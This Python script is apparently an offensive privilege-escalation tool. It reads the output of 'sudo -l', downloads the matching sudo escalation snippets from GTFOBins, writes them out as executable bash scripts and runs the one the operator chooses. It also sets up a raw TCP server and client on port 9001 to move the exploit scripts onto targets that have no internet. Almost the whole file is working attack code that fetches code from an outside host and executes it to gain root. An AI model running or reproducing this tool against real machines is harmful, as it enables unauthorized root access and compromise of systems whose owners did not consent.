#!/usr/bin/env python3
import requests, subprocess, html, sys, getopt, os, http.server, socketserver, re, time, socket, re, signal

from threading import Thread
from subprocess import check_output

# When ctrl+c is pressed listfile with be removed to clean up the directory
def signal_handler(sig, frame):
    os.system("rm listfile 2>/dev/null")
    sys.exit(0)

# Catches ctrl+z signal
signal.signal(signal.SIGINT, signal_handler)

# Ports for scoket capture
TCP_PORT = 9001
BUFFER_SIZE = 1024
# Adding in colourful text
class Colour:
    Black = "\u001b[30m"
    Red = "\u001b[31m"
    Green = "\u001b[32m"
    Yellow = "\u001b[33m"
    Blue = "\u001b[34m"
    Magenta = "\u001b[35m"
    White = "\u001b[37m"
    Cyan = "\u001b[36m"
    Reset = "\u001b[0m"
    # Theme
    Colour1 = Green
    Colour2 = Cyan
    Colour3 = Red
    Colour4 = White

# Class to open files from server and read them to local file
class ClientThread(Thread):
    def __init__(self,ip,port,sock,files,file):
        Thread.__init__(self)
        self.file = file
        self.files = files
        self.ip = ip
        self.port = port
        self.sock = sock
        print("New thread started for "+ip+":"+str(port))
    # Retrieving data from file
    def run(self):
        if self.files[0] != "listfile":
            file = f"exploits/{self.file}"
        else:
            file = self.file
        print(f"Openning {file}")
        f = open(file,'rb')
        while True:
            l = f.read(BUFFER_SIZE)
            while (l):
                self.sock.send(l)
                l = f.read(BUFFER_SIZE)
            if not l:
                f.close()
                self.sock.close()
                break
# Creates server so files can be collected by client
def startserver(TCP_IP, files):
    # Listenening for connections on set port and ip
    tcpsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    tcpsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    tcpsock.bind((TCP_IP, TCP_PORT))
    threads = []
    for file in files:
        tcpsock.listen(5)
        print("Waiting for incoming connections...")
        (conn, (ip,port)) = tcpsock.accept()
        print('Got connection from ', (ip,port))
        newthread = ClientThread(ip,port,conn,files,file)
        newthread.start()
        threads.append(newthread)

    for t in threads:
        t.join()
# Client to request files from server
def startclient(TCP_IP,file):
    # Establishing connection to server to read file into new file
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((TCP_IP, TCP_PORT))
    with open(file, 'wb') as f:
        print('file opened')
        while True:
            data = s.recv(BUFFER_SIZE)
            print('data =', (data).decode("utf-8").strip())
            if not data:
                f.close()
                print('file close()')
                break
            # Write data to a file
            f.write(data)
    print(f'{file} file transfered')
    s.close()
    print('connection closed')

# Gets the ip of the machine so allow for input selection
def get_ip():
    # Accuireing ip address from users hostnames in the format x.x.x.x
    valid_ips = 0
    ips = check_output(['hostname', '--all-ip-addresses']).decode("utf-8").split()
    print(f"{Colour.Colour1}Which ip address would you like to use?{Colour.Reset}\n")
    for index, ip in enumerate(ips):
        pattern = re.compile("^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$")
        test = pattern.match(ip)
        if test:
            print(f"{Colour.Colour4}{index}{Colour.Reset} - {Colour.Colour2}{ip}{Colour.Reset}\n")
            valid_ips +=1
    # Outputing ip options
    try:
        choice = int(input(f"{Colour.Colour1}>{Colour.Reset}{Colour.Colour2}"))
        if choice in range(valid_ips):
                return ips[choice]
        else:
                print(f"{Colour.Colour3}Exiting...{Colour.Reset}")
                sys.exit(2)
    except:
        print(f"{Colour.Colour3}Exiting...{Colour.Reset}")
        sys.exit(2)

def get_shell_code(value, verbose, output):
        # Making directory for explits if it doesn't exist
        os.system("mkdir exploits 2>/dev/null")
        for content in output:
                content = content.strip()
                # Sending GET request to website to pull shell code
                r = requests.get(f'https://gtfobins.github.io/gtfobins/{content}')
                if verbose:
                    print(f"Trying https://gtfobins.github.io/gtfobins/{content}\nStauts code - {r.status_code}")
                if r.status_code == 200:
                        if value == "check":
                            if verbose:
                                print("At least one exploit found")
                            print("True")
                            return 1
                        elif value == "findexploits":
                            # If ClI is "check" then it will return that there is an exploit
                            if verbose:
                                print(f"Appending {content} exploit to bash file")
                            exploits.append(content)
                            text = r.text
                            text = text.split('<h2 id="sudo"')[1]
                            text = text.split('<pre><code>')[1]
                            text = text.split("</code>")[0]
                            exploit_file = open(f"exploits/{content}",'w')
                            exploit_file.write("#!/bin/bash\n")
                            exploit_file.write(html.unescape(text))
                            exploit_file.close()
                            subprocess.run(["chmod", "+x", f"exploits/{content}"])
        if value == "check":
            if verbose:
                print("No exploit found")
            print("False")
            return 0

def sudolist(verbose, offline):
    # Getting contents of sudo -l command to search GTFOBins
    grep = "sudo -l | grep -oE '[^/ ]+$' | tail -n +4"
    if offline:
        os.system(f"{grep} > listfile")
        #fileserver.server(fileserver.get_ip(),"listfile")
    output = subprocess.check_output(grep, shell=True).decode("utf-8").split("\n")
    del output[-1]
    for exploit in output:
        exploits.append(exploit.strip())
    if verbose:
        if offline:
            print("Running sudo -l\nexploits written to listfile")
        else:
            print(f"Running sudo -l\nexploits found = {output}")
    return output

def showexploits():
    # Menu to show exploits
    print(f"{Colour.Colour1}Which exploit would you like to run?{Colour.Reset}")
    for index, exploit in enumerate(exploits):
            print(f"{Colour.Colour4}{index} - {Colour.Colour2}{exploit}{Colour.Reset}\n")
    print(f"{Colour.Colour1}Quit - <any other char/int>{Colour.Reset}")
    choice = input(">")
    # Outputing exploit options
    try:
        if int(choice) in range(0,len(exploits)):
                subprocess.run(["chmod", "+x", f"exploits/{exploits[int(choice)]}"])
                subprocess.run(f"./exploits/{exploits[int(choice)]}")
        else:
                print(f"{Colour.Colour3}Exiting...{Colour.Reset}")
                sys.exit(2)
    except:
        print(f"{Colour.Colour3}Exiting...{Colour.Reset}")
        sys.exit(2)

def main(argv):
    verbose = False
    short_options = "ho:v"
    long_options = ["help", "option=", "verbose"]
    help = f"""\n{Colour.Colour4}
  _    _ ______ _      _____
 | |  | |  ____| |    |  __ \\
 | |__| | |__  | |    | |__) |
 |  __  |  __| | |    |  ___/
 | |  | | |____| |____| |
 |_|  |_|______|______|_|
---------------------------------------------------------------------------------------------{Colour.Reset}
{Colour.Colour2}long argument{Colour.Reset}   {Colour.Magenta}short argument{Colour.Reset}    {Colour.Colour3}value{Colour.Reset}
{Colour.Colour4}---------------------------------------------------------------------------------------------{Colour.Reset}
{Colour.Colour2}--help{Colour.Reset}           {Colour.Magenta}-h{Colour.Reset}               {Colour.Colour3}n/a{Colour.Reset}
{Colour.Colour2}--option{Colour.Reset}         {Colour.Magenta}-o{Colour.Reset}               {Colour.Colour3}[check|findexploits|offlinetarget|offlinehost|runexploits]{Colour.Reset}
{Colour.Colour2}--verbose{Colour.Reset}        {Colour.Magenta}-v{Colour.Reset}               {Colour.Colour3}n/a{Colour.Reset}
{Colour.Colour4}---------------------------------------------------------------------------------------------{Colour.Reset}\n"""
    if len(argv) <1:
        print(f"An argument must be set{help}")
    try:
        arguments, values = getopt.getopt(argv, short_options, long_options)
    except getopt.error as error:
        # Output error, and return with an error code
        print(error)
        sys.exit(2)
    # Evaluate given options
    for current_argument, value in arguments:
        if current_argument in ("-h", "--help"):
            print(f"\nDisplaying help:{help}")
        elif current_argument in ("-v","--verbose"):
            verbose = True
        elif current_argument in ("-o", "--option"):
            if value in ["check","findexploits","offlinetarget","offlinehost","runexploits"]:
                print(f"Options mode ({Colour.Colour3}{value}{Colour.Reset})")
                global exploits
                exploits = []
                if value == "offlinetarget":
                    # Starting process for machine that has no internet
                    sudolist(verbose,True)
                    IP = get_ip()
                    startserver(IP,["listfile"])
                    ip = input(f"{Colour.Colour1}Input host machine ip (press enter when server is up on target machine){Colour.Reset}\n>")
                    print(exploits)
                    [startclient(ip,exploit) for exploit in exploits]
                    os.system("mkdir exploits 2>/dev/null")
                    [os.system(f"mv {exploit} exploits/") for exploit in exploits]
                    os.system("rm listfile")
                    showexploits()
                elif value == "offlinehost":
                    # Sarting process for machine with internet
                    # Input validation for listfile to see if it exsists
                    startclient(input(f"{Colour.Colour1}Input target machine ip\n>{Colour.Reset}"),"listfile")
                    get_shell_code("findexploits",verbose, open("listfile", "r"))
                    IP = get_ip()
                    startserver(IP,exploits)
                    os.system("rm -r exploits")
                    os.system("rm listfile")
                else:
                    get_shell_code(value,verbose, sudolist(verbose,False))
                    if value == "runexploits" and len(exploits)>0:
                        while True:
                            showexploits()
                            getinput = input("Would you like to run another exploit? Y/N \n>")
                            if getinput not in ["y","Y","yes"]:
                                print(f"{Colour.Colour3}Exiting...{Colour.Reset}")
                                sys.exit(2)
            else:
                print(f"\nInvalid Parameters:{help}")

if __name__ == "__main__":
   main(sys.argv[1:])
